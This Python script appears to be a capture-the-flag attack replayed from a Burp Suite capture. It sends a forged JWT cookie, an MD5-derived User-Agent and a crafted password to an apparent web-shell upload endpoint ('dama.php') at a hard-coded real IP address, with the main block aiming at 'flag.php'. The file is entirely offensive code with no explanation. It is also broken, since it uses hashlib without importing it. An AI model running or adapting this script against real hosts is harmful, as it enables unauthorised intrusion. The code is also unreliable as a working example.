#!/usr/bin/env python
# coding=utf-8

# @file aizhixi.py
# @brief aizhixi
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2018-09-21 21:43
import requests


def aizhixi(_pass):

    burp0_url = "http://114.55.36.69:8020/upload/dama.php"
    burp0_cookies = {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.xhOMA6ikDO_xWrKw0yNGqVH9JrKpNwcN4UJIL_S2po4"}
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Origin": "http://114.55.36.69:8020",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": hashlib.md5(_pass).hexdigest(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Referer": "http://114.55.36.69:8020/upload/dama.php",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh,en-US;q=0.9,en;q=0.8,ja;q=0.7,zh-CN;q=0.6",
        "Connection": "close"}
    burp0_data = {"pass": _pass, "submit": "submit"}
    requests.post(
        burp0_url,
        headers=burp0_headers,
        cookies=burp0_cookies,
        data=burp0_data)


if __name__ == '__main__':
    url="114.55.36.69:8020/flag.php"
    aizhixi("a"*10+"114.55.36."+"b"*10+"69:8020")
